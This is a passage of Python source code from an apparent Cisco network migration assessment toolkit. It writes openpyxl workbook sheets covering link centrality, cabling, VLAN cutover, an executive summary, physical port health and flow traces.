            "Hard Partitions", "Backup-Covered", "FHRP-Covered", "Per-VLAN Detail"]
    if FAILURE_SHEET_NAME in wb.sheetnames:
        del wb[FAILURE_SHEET_NAME]
    ws = _new_sheet(wb, FAILURE_SHEET_NAME)
    _census_header(ws, cols)
    rows = rows or []
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="top", wrap_text=True)
    r = 2
    for rec in rows:
        vals = [rec["severity"], rec["host"], rec["vlans_impacted"], rec["stranded"],
                rec["hard"], rec["backup"], rec["fhrp"], rec["detail"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
            if col == 1 and rec["severity"] in _SEV_FILL:
                c.fill = PatternFill("solid", fgColor=_SEV_FILL[rec["severity"]])
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    ws.column_dimensions["H"].width = 70
    logger.info(f"  [OK] '{FAILURE_SHEET_NAME}' sheet: {len(rows)} switch(es) analyzed")


LINK_CENTRALITY_SHEET_NAME = "Link Centrality"

def write_link_centrality_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write (or replace) 'Link Centrality': structural chokepoint ranking of the inter-switch links --
    edge betweenness (share of all-pairs shortest-path flow that crosses each link) + bridge detection
    (links whose failure partitions the fabric). The LINK twin of the per-switch 'Failure Impact' sheet;
    same compute_link_centrality the explorer's chokepoint card consumes (one source of truth)."""
    from cisco_toolkit.analyze import compute_link_centrality
    cols = ["Rank", "Link", "Betweenness", "Bridge / SPOF", "Switch-Pairs Severed", "Assessment"]
    if LINK_CENTRALITY_SHEET_NAME in wb.sheetnames:
        del wb[LINK_CENTRALITY_SHEET_NAME]
    ws = _new_sheet(wb, LINK_CENTRALITY_SHEET_NAME)
    _census_header(ws, cols)
    rows = compute_link_centrality(all_interfaces)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    DAT_C = Alignment(horizontal="center", vertical="center")
    warn_fill = PatternFill("solid", fgColor="F4CCCC")
    r = 2
    for rec in rows:
        link = f"{rec['a_host']} {rec['a_port']} <-> {rec['b_host']} {rec['b_port']}".strip()
        bridge = "YES" if rec["is_bridge"] else ""
        cut = rec["pairs_cut"] if rec["is_bridge"] else ""
        if rec["is_bridge"]:
            note = "Bridge — its failure partitions the fabric (true single point of failure)"
        elif int(rec["rank"]) <= 3:
            note = "High betweenness — a large share of east-west paths funnel through this link"
        else:
            note = ""
        vals = [rec["rank"], link, rec["betweenness"], bridge, cut, note]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT
            c.alignment = DAT_C if col in (1, 3, 4, 5) else DAT_L
            if rec["is_bridge"] and col in (4, 5):
                c.fill = warn_fill
        r += 1
    if r == 2:
        ws.cell(2, 1, "-"); ws.cell(2, 2, "No inter-switch links detected")
    _census_autofit(ws, len(cols), r - 1)
    ws.column_dimensions["B"].width = 48
    ws.column_dimensions["F"].width = 62
    logger.info(f"  [OK] '{LINK_CENTRALITY_SHEET_NAME}' sheet: {len(rows)} link(s), "
                f"{sum(1 for x in rows if x['is_bridge'])} bridge(s)")


CABLING_SCHEDULE_SHEET_NAME = "Cabling Schedule"


def write_cabling_schedule_sheet(wb, cable_map: dict) -> None:
    """Write (or replace) 'Cabling Schedule': one row per physical cable from the EDA-style cable-map
    SSOT (compute_cable_map) -- the same node/port/cable model the explorer + webapp render. It carries
    each link's OPERATIONAL status (coverage-honest: an uncollected / unobserved end is '[NOT OBSERVED]',
    never a fake 'Up') and bundles port-channel members into one row."""
    cols = ["Switch A", "Port A", "Switch B", "Port B", "Speed", "Type", "LAG Members", "Op-Status", "Seen"]
    if CABLING_SCHEDULE_SHEET_NAME in wb.sheetnames:
        del wb[CABLING_SCHEDULE_SHEET_NAME]
    ws = _new_sheet(wb, CABLING_SCHEDULE_SHEET_NAME)
    _census_header(ws, cols)
    cables = (cable_map or {}).get("cables") or []
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    DAT_C = Alignment(horizontal="center", vertical="center")
    op_label = {"up": "Up", "down": "Down", "unknown": "[NOT OBSERVED]"}
    op_fill = {"up": PatternFill("solid", fgColor="D9EAD3"),      # green
               "down": PatternFill("solid", fgColor="F4CCCC"),    # red
               "unknown": PatternFill("solid", fgColor="EFEFEF")}  # neutral grey ([NOT OBSERVED])
    r = 2
    for c in cables:
        if not isinstance(c, dict):
            continue
        is_pc = bool(c.get("is_pc"))
        op = str(c.get("op_status") or "unknown")
        vals = [c.get("a", ""), c.get("a_port", ""), c.get("b", ""), c.get("b_port", ""),
                c.get("speed", ""),
                "Port-channel" if is_pc else "Single",
                len(c.get("members") or []) if is_pc else "",
                op_label.get(op, op), c.get("confirmation", "")]
        for col, v in enumerate(vals, 1):
            cell = ws.cell(row=r, column=col, value=v)
            cell.font = DAT_FONT
            cell.alignment = DAT_C if col in (5, 6, 7, 8) else DAT_L
            if col == 8:
                cell.fill = op_fill.get(op, op_fill["unknown"])
        r += 1
    if r == 2:
        ws.cell(2, 1, "-")
        ws.cell(2, 2, "No CDP/LLDP cabling detected")
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{CABLING_SCHEDULE_SHEET_NAME}' sheet: {len(cables)} cable(s)")


WAVE_SEQUENCING_SHEET_NAME = "Wave Sequencing"

def write_wave_sequencing_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]],
                                move_groups: List[Dict[str, object]]) -> None:
    """Write (or replace) 'Wave Sequencing': per move-group cutover plan -- which member switches are HARD
    CUTOVERS (single-homed, need a maintenance window) vs MAKE-BEFORE-BREAK (dual-homed, migrate live).
    Same compute_wave_sequencing the explorer's Waves mode consumes (one source of truth)."""
    from cisco_toolkit.analyze import compute_wave_sequencing
    cols = ["Group", "Cutover Plan", "Hard Cutover (window)", "Make-Before-Break", "Endpoints at Risk"]
    if WAVE_SEQUENCING_SHEET_NAME in wb.sheetnames:
        del wb[WAVE_SEQUENCING_SHEET_NAME]
    ws = _new_sheet(wb, WAVE_SEQUENCING_SHEET_NAME)
    _census_header(ws, cols)
    rows = compute_wave_sequencing(all_interfaces, move_groups)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="top", wrap_text=True)
    DAT_C = Alignment(horizontal="center", vertical="center")
    warn_fill = PatternFill("solid", fgColor="FCE5CD")
    r = 2
    for rec in rows:
        hard = ", ".join(str(h) for h in rec["hard_cutover"])
        mbb = ", ".join(str(h) for h in rec["make_before_break"])
        vals = [rec["group"], rec["sequence"], hard, mbb, rec["hard_cutover_endpoints"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT
            c.alignment = DAT_C if col == 5 else DAT_L
            if rec["hard_cutover"] and col in (3, 5):
                c.fill = warn_fill
        r += 1
    if r == 2:
        ws.cell(2, 1, "-"); ws.cell(2, 2, "No move groups")
    _census_autofit(ws, len(cols), r - 1)
    ws.column_dimensions["B"].width = 54
    ws.column_dimensions["C"].width = 34
    ws.column_dimensions["D"].width = 34
    logger.info(f"  [OK] '{WAVE_SEQUENCING_SHEET_NAME}' sheet: {len(rows)} group(s)")


VLAN_CUTOVER_SHEET_NAME = "VLAN Cutover Matrix"


def write_vlan_cutover_sheet(wb, vlan_cutover: List[dict]) -> None:
    """Write 'VLAN Cutover Matrix' (MASTER_PLAN 2026-07-05 §4.3): one row per evidenced VLAN with
    every cutover-relevant fact joined from the already-computed axes (STP root + default-election
    smell, FHRP election detail, gateway SVIs, endpoint census, app domain / criticality,
    dependency flags, wave / scenario / readiness) plus the two DELIBERATELY blank human columns
    (Cutover Window / Rollback Owner) the team fills during the window. Pure presentation of
    compute_vlan_cutover_matrix (one source of truth with snap['vlan_cutover'])."""
    from cisco_toolkit.analyze import VLAN_CUTOVER_NOT_OBSERVED
    cols = ["VLAN", "Name", "STP Root", "Root Default-Election", "FHRP",
            "Gateway SVIs", "Endpoint MACs (per-port sum)", "Endpoint Mix", "App Domain", "Criticality",
            "Dependencies", "Wave", "Scenario", "Readiness", "Cutover Window", "Rollback Owner"]
    ws = _new_sheet(wb, VLAN_CUTOVER_SHEET_NAME)
    _census_header(ws, cols)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="top", wrap_text=True)
    DAT_C = Alignment(horizontal="center", vertical="center")
    warn_fill = PatternFill("solid", fgColor="FCE5CD")
    r = 2
    for rec in (vlan_cutover or []):
        fhrp = rec.get("fhrp")
        if isinstance(fhrp, dict):
            mem = ", ".join(
                f"{m.get('host')} {m.get('role') or '?'}"
                + (f" prio {m['priority']}" if m.get("priority") is not None else "")
                + (" preempt" if m.get("preempt") else "")
                for m in (fhrp.get("members") or []))
            head = " ".join(x for x in (fhrp.get("proto") or "",
                                        f"grp {fhrp.get('group')}" if fhrp.get("group") else "",
                                        f"VIP {fhrp.get('vip')}" if fhrp.get("vip") else "") if x)
            vmacs = sorted({m.get("vmac") for m in (fhrp.get("members") or []) if m.get("vmac")})
            fhrp_txt = head + (f" — {mem}" if mem else "") \
                + (f" (vMAC {', '.join(vmacs)})" if vmacs else "")
        else:
            fhrp_txt = str(fhrp or "")
        # tri-state honesty: yes / no only when a root was observed; blank = no claim possible
        root_seen = rec.get("stp_root") != VLAN_CUTOVER_NOT_OBSERVED
        de = ("yes" if rec.get("stp_root_default_election") else "no") if root_seen else ""
        vals = [rec.get("vlan"), rec.get("name", ""), rec.get("stp_root", ""), de, fhrp_txt,
                ", ".join(rec.get("gateway_svi_hosts") or []), rec.get("endpoint_count", 0),
                rec.get("endpoint_mix", ""),
                rec.get("app_domain", ""), rec.get("criticality", ""),
                "; ".join(rec.get("dependencies") or []), rec.get("wave", ""),
                rec.get("scenario", ""), rec.get("readiness", ""),
                rec.get("cutover_window", ""), rec.get("rollback_owner", "")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT
            c.alignment = DAT_C if col in (1, 7) else DAT_L
        if rec.get("stp_root_default_election"):
            ws.cell(r, 3).fill = warn_fill; ws.cell(r, 4).fill = warn_fill
        if rec.get("readiness") == "NOT READY":
            ws.cell(r, 14).font = Font(name="Calibri", size=10, bold=True, color="C00000")
        r += 1
    if r == 2:
        # coverage-honest empty state: scoped to the collection, not a claim of "no VLANs exist"
        ws.cell(2, 1, "-"); ws.cell(2, 2, "No VLAN evidenced in the collected devices")
    _census_autofit(ws, len(cols), r - 1)
    for letter, w in (("E", 46), ("H", 24), ("K", 36), ("M", 34), ("O", 16), ("P", 16)):
        ws.column_dimensions[letter].width = w
    logger.info(f"  [OK] '{VLAN_CUTOVER_SHEET_NAME}' sheet: {len(vlan_cutover or [])} VLAN(s)")


EXEC_SUMMARY_SHEET_NAME = "Executive Summary"

def write_executive_summary_sheet(wb, health_scores: list, punchlist: list,
                                  migration_readiness: list,
                                  failure_impact: list, brief=None, provenance=None,
                                  assessment_integrity=None) -> None:
    """Write the 'Executive Summary' landing sheet (moved to the FRONT of the workbook): a one-page
    synthesis -- fleet posture, the keystone devices the fleet most depends on (migration blast radius),
    the punch-list severity / category breakdown, and per-group migration readiness -- so a reader knows
    where to start without opening all 30+ detail tabs. This is the workbook twin of the explorer's Risk
    cockpit: pure presentation of already-computed data; every detail tab remains the source of record."""
    ws = _new_sheet(wb, EXEC_SUMMARY_SHEET_NAME)
    TITLE = Font(name="Calibri", bold=True, size=15, color=DOC_NAVY_HEX)
    SUB   = Font(name="Calibri", bold=True, size=11, color=DOC_NAVY_HEX)
    KEY   = Font(name="Calibri", bold=True, size=10)
    DAT   = Font(name="Calibri", size=10)
    HDR   = Font(name="Calibri", bold=True, size=10, color="FFFFFF")
    HFILL = PatternFill("solid", fgColor="434343")
    WRAP  = Alignment(horizontal="left", vertical="top", wrap_text=True)
    CEN   = Alignment(horizontal="center")
    r = 1
    def _sub(t):
        nonlocal r
        ws.cell(r, 1, t).font = SUB; r += 1
    def _kv(k, v):
        nonlocal r
        ws.cell(r, 1, k).font = KEY; ws.cell(r, 2, v).font = DAT; r += 1
    def _hdr(cols):
        nonlocal r
        for i, h in enumerate(cols, 1):
            c = ws.cell(r, i, h); c.font = HDR; c.fill = HFILL; c.alignment = CEN
        r += 1

    ws.cell(r, 1, "Network Migration Assessment — Executive Summary").font = TITLE
    r += 2

    ai = assessment_integrity if isinstance(assessment_integrity, dict) else {}
    if not ai and isinstance(provenance, dict) and isinstance(provenance.get("assessment_integrity"), dict):
        ai = provenance["assessment_integrity"]
    failed = ai.get("failed_phases")
    failed = failed if isinstance(failed, list) else ([failed] if failed else [])
    if isinstance(brief, dict) and brief.get("_unavailable") and "Executive brief" not in failed:
        failed = list(failed) + ["Executive brief"]
    for key, value in ai.items():
        if key not in ("failed_phases", "n_violations") and \
                str(value).strip().lower() in ("failed", "compute_failed", "unavailable", "error"):
            failed = list(failed) + [f"{key}: {value}"]
    failed = list(dict.fromkeys(str(x) for x in failed))

    def _phase_failed(*tokens):
        def _key(value):
            return "".join(ch for ch in str(value).lower() if ch.isalnum())
        return any(any(_key(token) in _key(item) for token in tokens) for item in failed)
    if failed:
        _sub("ASSESSMENT INTEGRITY - UNVERIFIED")
        cell = ws.cell(
            r, 1,
            f"{len(failed)} phase(s) failed or were unavailable: "
            + ", ".join(str(x) for x in failed)
            + ". Empty fallback sections are NOT clean results; repair and regenerate before a go/no-go decision.")
        cell.font = Font(name="Calibri", bold=True, size=10, color="9C0006")
        cell.fill = PatternFill("solid", fgColor="FFC7CE")
        cell.alignment = WRAP
        ws.merge_cells(start_row=r, start_column=1, end_row=r, end_column=6)
        r += 2

    # --- migration brief (cross-axis synthesis) NEW-V3.23.120 ---
    eb = brief if isinstance(brief, dict) else {}
    if eb.get("axes"):
        _sub("Migration brief")
        ps = eb.get("posture_statement", "")
        if ps:
            c = ws.cell(r, 1, ps); c.font = Font(name="Calibri", bold=True, size=10, color="9C0006")
            c.alignment = WRAP; r += 1
        tg = eb.get("top_gating") or []
        if tg:
            ws.cell(r, 1, "Address first").font = KEY
            # DISCLOSE the cut (the subnet-reachability '(+N)' house pattern): these are the
            # brief's GATING items, and a reader who plans around the 6 shown is short the rest
            # (Meridian reference fleet: 9). The axis table below lists one row per axis, not per gating item,
            # so nothing else on this sheet carries the missing three.
            c = ws.cell(r, 2, " · ".join(tg[:6]) + (f" (+{len(tg) - 6})" if len(tg) > 6 else ""))
            c.font = DAT; c.alignment = WRAP; r += 1
        _hdr(["Axis", "Severity", "Headline"])
        SEVFILL = {"Critical": "F4CCCC", "High": "FCE4D6", "Medium": "FFF2CC", "Low": "D9EAD3", "Info": "EFEFEF"}
        for a in eb["axes"]:
            ws.cell(r, 1, a.get("axis")).font = DAT
            sc = ws.cell(r, 2, a.get("severity")); sc.font = DAT
            sc.fill = PatternFill("solid", fgColor=SEVFILL.get(a.get("severity"), "FFFFFF"))
            hc = ws.cell(r, 3, a.get("headline")); hc.font = DAT; hc.alignment = WRAP
            r += 1
        r += 1

    # --- fleet posture (health band distribution) ---
    health_unavailable = _phase_failed("health score") or not isinstance(health_scores, list)
    hs = [x for x in (health_scores if isinstance(health_scores, list) else [])
          if isinstance(x, dict)]
    n = len(hs)
    bands = {"Excellent": 0, "Good": 0, "Fair": 0, "Poor": 0, "Critical": 0}
    for x in hs:
        b = x.get("band", "")
        if b in bands:
            bands[b] += 1
    avg = round(sum((x.get("score") or 0) for x in hs) / n) if n else 0
    # SSOT (QA F1/F2): read the canonical executive_brief block every narrative surface uses -- the local
    # arithmetic mean overstates vs posture.avg_health (criticality-weighted), and "assessed = 303" overstates
    # coverage by the 50 not-collected devices vs scale.n_collected. Fall back to the local recompute only if
    # the brief is absent (legacy snapshot).
    _ebp = eb.get("posture") if isinstance(eb.get("posture"), dict) else {}
    _ebs = eb.get("scale") if isinstance(eb.get("scale"), dict) else {}
    _ncoll = _ebs.get("n_collected"); _avgc = _ebp.get("avg_health")
    _sub("Fleet posture")
    if health_unavailable:
        _kv("Switches collected / inventoried", "UNVERIFIED (health-score phase unavailable)")
        _kv("Average health score", "UNVERIFIED")
    elif isinstance(brief, dict) and brief.get("_unavailable"):
        # the executive-brief compute RAISED -> _run_phase wired the {'_unavailable':True} sentinel. Do NOT fall
        # back to the raw recompute: that fabricates full collection coverage (n/n) + an all-rows mean that the
        # 'Insufficient Data' devices inflate. Disclose the gap, exactly as the Architecture Review sheet does
        # for the same sentinel (audit-3 #2 false-health).
        _kv("Switches collected / inventoried", f"— / {n} (executive brief unavailable — compute failed)")
        _kv("Average health score", "— (executive brief unavailable)")
    else:
        _kv("Switches collected / inventoried", f"{_ncoll if isinstance(_ncoll, int) else n} / {n}")
        _kv("Average health score", f"{_avgc if isinstance(_avgc, (int, float)) else avg} / 100")
    _kv("Critical band", "UNVERIFIED" if health_unavailable else bands["Critical"])
    _kv("Poor / Fair", "UNVERIFIED" if health_unavailable else bands["Poor"] + bands["Fair"])
    _kv("Good / Excellent", "UNVERIFIED" if health_unavailable else bands["Good"] + bands["Excellent"])
    r += 1

    # canonical scope/scale from the published brief (one source — not a raw-array recompute). The sheet
    # showed band counts but never the fleet scale (the endpoints / VLANs the other deliverables headline).
    _sc = eb.get("scale") or {}
    if _sc:
        _sub("Scope / scale")
        _kv("Devices inventoried", _sc.get("n_devices"))
        _kv("Endpoints (evidenced)", _sc.get("n_endpoints"))
        _kv("VLANs in use", _sc.get("n_vlans"))
        r += 1

    # --- punch-list severity / category breakdown ---
    punch_unavailable = _phase_failed("punch-list", "punchlist") or not isinstance(punchlist, list)
    pl = [x for x in (punchlist if isinstance(punchlist, list) else [])
          if isinstance(x, dict)]
    sev = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
    cats: Dict[str, int] = {}
    for it in pl:
        s = it.get("severity", "")
        if s in sev:
            sev[s] += 1
        cat = it.get("category", "Other")
        cats[cat] = cats.get(cat, 0) + 1
    _sub("Migration punch-list — UNVERIFIED" if punch_unavailable
         else f"Migration punch-list — {len(pl)} item(s)")
    _kv("Critical / High", "UNVERIFIED" if punch_unavailable
        else f"{sev['Critical']} / {sev['High']}")
    _kv("Medium / Low", "UNVERIFIED" if punch_unavailable
        else f"{sev['Medium']} / {sev['Low']}")
    # ranked, cut at 5 and the remainder COUNTED: "Top categories" names the ranking but not the
    # population, so five entries read as the punch-list's whole category set (Meridian reference fleet: 17
    # categories, the 12 hidden ones carrying 176 of the 1,805 items).
    top_cats = sorted(cats.items(), key=lambda t: -t[1])[:5]
    _cat_txt = ", ".join(f"{k} ({v})" for k, v in top_cats)
    if _cat_txt and len(cats) > len(top_cats):
        _cat_txt += f" (+{len(cats) - len(top_cats)} more categor{'ies' if len(cats) - len(top_cats) > 1 else 'y'})"
    _kv("Top categories", "UNVERIFIED" if punch_unavailable else (_cat_txt or "—"))
    r += 1

    # --- keystone devices (the few the fleet actually depends on; works when scores saturate) ---
    fi = failure_impact or []                          # NEW-V3.23.91: precomputed once in main
    # A 10-row table headed "fix-first" reads as the keystone population; on the Meridian reference fleet 193 of the
    # 303 simulated devices strand at least one endpoint. Name the ratio so the reader sizes the
    # problem, not the table. (Rows with NO stranded figure are unmeasured, never counted as zero.)
    _n_keystone = sum(1 for rec in fi
                      if isinstance(rec, dict) and isinstance(rec.get("stranded"), (int, float))
                      and rec["stranded"] > 0)
    _sub("Keystone devices — fix-first (by migration blast radius)"
         + (f" — top 10 of {_n_keystone} device(s) that strand ≥1 endpoint"
            if _n_keystone > 10 else ""))
    _hdr(["Rank", "Device", "Severity", "Endpoints stranded", "VLANs impacted"])
    for i, rec in enumerate(fi[:10], 1):
        ws.cell(r, 1, i).font = DAT
        ws.cell(r, 2, rec.get("host", "")).font = DAT
        ws.cell(r, 3, rec.get("severity", "")).font = DAT
        ws.cell(r, 4, rec.get("stranded", 0)).font = DAT
        ws.cell(r, 5, rec.get("vlans_impacted", 0)).font = DAT
        r += 1
    r += 1

    # --- per-group migration readiness ---
    readiness_unavailable = (
        _phase_failed("migration readiness")
        or not isinstance(migration_readiness, list)
    )
    mr = [x for x in (migration_readiness if isinstance(migration_readiness, list) else [])
          if isinstance(x, dict)]
    if readiness_unavailable:
        _sub("Migration readiness (per move group) — UNVERIFIED")
        _kv("Gate", "Readiness computation failed or was unavailable; no READY conclusion is issued.")
        r += 1
    elif mr:
        _sub("Migration readiness (per move group)")
        _hdr(["Group", "Verdict", "Switches", "Endpoints", "Fail", "Warn"])
        for g in mr:
            ws.cell(r, 1, g.get("group", "")).font = DAT
            ws.cell(r, 2, g.get("readiness", "")).font = DAT
            ws.cell(r, 3, len(g.get("switches", []) or [])).font = DAT
            ws.cell(r, 4, g.get("endpoints", 0)).font = DAT
            ws.cell(r, 5, g.get("n_fail", 0)).font = DAT
            ws.cell(r, 6, g.get("n_warn", 0)).font = DAT
            r += 1
        r += 1

    # --- headline: where to start ---
    _sub("Where to start")
    lines = []
    if fi:
        top = fi[0]
        lines.append(f"• {top.get('host')} is the top keystone — its loss strands "
                     f"{top.get('stranded', 0)} endpoint(s). Harden it first (FHRP / a redundant path).")
    if not health_unavailable and n and bands["Critical"] == n:
        lines.append(f"• All {n} switches land in the Critical band — the per-switch score is "
                     f"saturated, so prioritise by blast radius (above), not by score.")
    if punch_unavailable:
        lines.append("• Migration punch-list is UNVERIFIED — repair the failed producer before "
                     "using this page for prioritization or go/no-go.")
    else:
        lines.append(f"• {sev['Critical']} critical + {sev['High']} high punch-list item(s) — see the "
                     f"'Migration Punch-List' tab for the full ranked, per-device action list.")
    for ln in lines:
        c = ws.cell(r, 1, ln); c.font = DAT; c.alignment = WRAP
        ws.merge_cells(start_row=r, start_column=1, end_row=r, end_column=6)
        r += 1

    # --- document control / provenance (P3-E3): make the one-page landing sheet self-traceable to the
    # exact engine + snapshot that produced it -- the workbook twin of the deck title-footer (deck.py).
    # Absent fields are omitted, never fabricated (an older snapshot missing a field shows fewer rows).
    prov = provenance or {}
    _prov_rows = [
        ("Engine version", str(prov.get("script_version") or "").strip()),
        ("Generated", str(prov.get("generated_at") or "")[:19].replace("T", " ").strip()),
        ("Snapshot", str(prov.get("snapshot") or "").strip()),
    ]
    _prov_rows = [(k, v) for k, v in _prov_rows if v]
    if _prov_rows:
        r += 1
        _sub("Document control")
        for k, v in _prov_rows:
            _kv(k, v)

    for i, w in enumerate([26, 30, 16, 20, 16, 12], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    # land the summary as the first tab in the workbook
    wb.move_sheet(ws, -wb.index(ws))
    logger.info(f"  [OK] '{EXEC_SUMMARY_SHEET_NAME}' sheet: {n} switch(es); "
                f"top keystone {fi[0]['host'] if fi else '-'}")


# =============================================================================
# Fused compute-in-writer sheets (PHASE 2.7 step 25): write_physical_health_sheet
# and write_l3_forwarding_sheet compute their L1/L3 records inline AND return them to
# main() (for the snapshot); write_flow_trace_sheet renders a trace_full_flow() dict.
# =============================================================================
PHYSICAL_HEALTH_SHEET_NAME = "Physical Health"

def write_physical_health_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]],
                                all_cmd_to_files: Dict[str, Dict[str, str]],
                                all_device_physical: List[DevicePhysical]) -> List[dict]:
    """Write the 'Physical Health' (L1) sheet and return its records for the snapshot.
    One row per physical port; risk flag derived purely from already-parsed data."""

    model = build_network_model(all_interfaces)
    uplink_ports, single_fiber = _physical_uplink_index(model)
    poe_util = _poe_device_util(all_device_physical)

    headers = ["Switch", "Port", "Status", "Negotiated Speed", "Duplex", "Media Type",
               "Input Errors", "CRC Errors", "Output Drops", "Port-Channel",
               "PoE Allocated (W)", "Physical Risk"]

    def _intpos(v):
        return isinstance(v, int) and v > 0

    records: List[dict] = []
    for host in sorted(all_interfaces):
        c2f = all_cmd_to_files.get(host, {})
        out = _load_cmd_output(c2f, "show interfaces", "show interface")
        counters = parse_show_interface_counters(out) if out else {}
        phy = parse_interface_phy(out) if out else {}
        poe_out = _load_cmd_output(c2f, "show power inline")
        poe_watts = _parse_poe_watts(poe_out) if poe_out else {}

        for port, d in sorted(all_interfaces[host].items()):
            if not _is_physical_port(port):
                continue
            cnt = counters.get(port, {})
            ph = phy.get(port, {})

            status = d.status or cnt.get("oper", "")
            oper_up = bool(re.search(r"up|connected", (cnt.get("oper", "") or status or ""), re.IGNORECASE))

            speed = ph.get("speed") or normalize_speed(d.speed) or d.speed or ""
            duplex = ph.get("duplex") or ""                    # DETAIL is authoritative for half
            media = ph.get("media") or (_classify_media(d.port_type) if d.port_type else "")

            ie = cnt.get("input_errors", "")
            crc = cnt.get("crc", "")
            od = cnt.get("output_drops", "")
            oe = cnt.get("output_errors", "")            # output-side L1 (TX errors)
            lc = cnt.get("late_collisions", "")          # late collisions = duplex mismatch
            pc = d.port_channel or ""

            # PoE cell: per-port watts if parseable, else the status word; mark over-budget devices.
            watts = poe_watts.get(port)
            if watts is not None:
                poe_cell = f"{watts:g} W"
            elif d.poe_status:
                poe_cell = d.poe_status
            else:
                poe_cell = ""
            util = poe_util.get(host)
            if util is not None and util > 90 and (watts is not None or d.poe_status):
                poe_cell = (poe_cell + f"  (dev PoE {util:g}%)").strip()

            # ---- risk derivation (highest severity wins for the cell fill) ----
            flags: List[str] = []
            sev = "Info"
            is_uplink = (host, port) in uplink_ports
            is_trunk = (d.switchport_mode or "").strip().lower() == "trunk"

            if re.search(r"err[- ]?disab", (status or ""), re.IGNORECASE):
                flags.append("err-disabled"); sev = "High"
            if duplex == "Half" and (is_trunk or is_uplink):
                flags.append("half-duplex"); sev = "High"
            if (host, port) in single_fiber:
                flags.append("single-fiber-uplink")
                if sev != "High": sev = "Medium"
            if oper_up and (_intpos(ie) or _intpos(crc) or _intpos(od) or _intpos(oe) or _intpos(lc)):
                flags.append("error-rate-high")
                if sev != "High": sev = "Medium"
            if not flags:
                # `show interfaces` is NOT an essential command and _load_cmd_output is an exact-match
                # lookup, so `counters` is routinely {} for a whole device -- and even when it parsed, a
                # port present in `show interface status` can be absent from it. The error-rate check
                # above then cannot fire, and the row used to print blank error counters plus the word
                # "ok", byte-identical to a genuinely clean port, while Collection Completeness still
                # tiered the device "complete". That is this file's own stated rule (see
                # write_coverage_schema_sheet) broken: absence of evidence is never health. Only an
                # operationally UP port is marked -- on a down port the error-rate check is inapplicable
                # rather than unevaluated, so its "ok" is not a claim about unseen counters.
                if oper_up and not cnt:
                    flags = [f"{HEALTH_NOT_OBSERVED} - no 'show interfaces' counters for this port; "
                             f"L1 error rate NOT assessed"]
                else:
                    flags = ["ok"]

            records.append({"switch": host, "port": port, "status": status or "",
                            "speed": speed or "unknown", "duplex": duplex or "unknown",
                            "media": media or "unknown", "input_errors": ie, "crc_errors": crc,
                            "output_errors": oe, "late_collisions": lc,
                            "output_drops": od, "port_channel": pc, "poe": poe_cell,
                            "risk": "; ".join(flags), "severity": sev})

    # ---- write the sheet ----
    ws = _new_sheet(wb, PHYSICAL_HEALTH_SHEET_NAME)
    hdr_font = Font(bold=True, color="FFFFFF")
    hdr_fill = PatternFill("solid", fgColor="434343")
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = hdr_font
        c.fill = hdr_fill
        c.alignment = Alignment(horizontal="center")
    for r, rec in enumerate(records, 2):
        vals = [rec["switch"], rec["port"], rec["status"], rec["speed"], rec["duplex"],
                rec["media"], rec["input_errors"], rec["crc_errors"], rec["output_drops"],
                rec["port_channel"], rec["poe"], rec["risk"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if col == len(headers) and rec["severity"] in _SEV_FILL:     # fill Physical Risk cell
                c.fill = PatternFill("solid", fgColor=_SEV_FILL[rec["severity"]])
    for i, w in enumerate([16, 16, 14, 16, 9, 14, 12, 11, 13, 13, 18, 28], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"

    # A blind spot is neither "ok" nor a finding — count it as its own third thing, or the log turns
    # every unassessed port into a flagged one (and hides how much of L1 was never seen).
    n_blind = sum(1 for x in records if str(x["risk"]).startswith(HEALTH_NOT_OBSERVED))
    n_flagged = sum(1 for x in records
                    if x["risk"] != "ok" and not str(x["risk"]).startswith(HEALTH_NOT_OBSERVED))
    logger.info(f"  [OK] '{PHYSICAL_HEALTH_SHEET_NAME}' sheet: {len(records)} physical port(s), "
                f"{n_flagged} flagged"
                + (f", {n_blind} NOT assessed (no interface counters collected)" if n_blind else ""))
    return records


FLOW_TRACE_SHEET_NAME = "Flow Trace"
_RISK_FILL = {"LOW": "36E08A", "MEDIUM": "FFE566", "HIGH": "FF9F45", "CRITICAL": "FF5775"}
_RISK_RANK = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}

def write_flow_trace_sheet(wb, flow: dict) -> None:
    """Write the 'Flow Trace' sheet from a trace_full_flow() result."""

    s = flow["summary"]
    ws = _new_sheet(wb, FLOW_TRACE_SHEET_NAME)
    bold = Font(bold=True)

    ws.cell(1, 1, f"Flow Trace  {s['src_ip']}  ->  {s['dst_ip']}").font = Font(bold=True, size=13)
    meta = [("Source", s["src_location"]), ("Destination", s["dst_location"]),
            ("Flow type", s["flow_type"]),
            ("SPOFs on path", f"{s['spof_count']}" + (f"  ({', '.join(s['spofs'])})" if s["spofs"] else "")),
            ("Risk level", s["risk"])]
    r = 2
    for label, val in meta:
        ws.cell(r, 1, label).font = bold
        c = ws.cell(r, 2, val)
        if label == "Risk level" and s["risk"] in _RISK_FILL:
            c.fill = PatternFill("solid", fgColor=_RISK_FILL[s["risk"]])
            c.font = bold
        r += 1
    r += 1

    headers = ["#", "Layer", "From", "To", "Interface", "Detail", "SPOF"]
